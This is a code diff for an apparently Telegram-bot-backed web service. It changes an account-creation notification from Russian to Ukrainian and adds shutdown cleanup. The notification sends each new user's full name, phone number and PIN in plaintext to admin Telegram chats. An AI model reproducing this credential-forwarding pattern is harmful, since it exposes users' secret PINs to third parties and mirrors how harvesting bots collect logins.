@@ -25,10 +25,10 @@ async def notify_account_created(request: Request):
         return JSONResponse(content={"error": "Missing required fields"}, status_code=400)
 
     message = (
-        f"🆕 <b>Создан новый аккаунт!</b>\n\n"
-        f"👤 <b>ФИО:</b> {full_name}\n"
-        f"📞 <b>Номер:</b> {phone}\n"
-        f"🔑 <b>Пин-код:</b> {pin}"
+        f"📱 <b>Новий акаунт створено!</b>\n\n"
+        f"👤 <b>ПІБ:</b> <code>{full_name}</code>\n"
+        f"📞 <b>Номер:</b> <code>{phone}</code>\n"
+        f"🔑 <b>PIN:</b> <code>{pin}</code>"
     )
 
     for admin_id in ADMIN_IDS:
@@ -63,8 +63,20 @@ async def run_api():
 
 
 async def main():
-    logging.basicConfig(level=logging.INFO, stream=sys.stdout)
-    await asyncio.gather(run_bot(), run_api())
+    logging.basicConfig(
+        level=logging.INFO,
+        stream=sys.stdout
+    )
+    
+    try:
+        await asyncio.gather(run_bot(), run_api())
+    finally:
+        # Cleanup API sessions
+        from api_user import user_api
+        from api_admin import admin_api
+        await user_api.close()
+        await admin_api.close()
+        logging.info("Sessions closed. Shutdown complete.")
 
 if __name__ == "__main__":
     try:
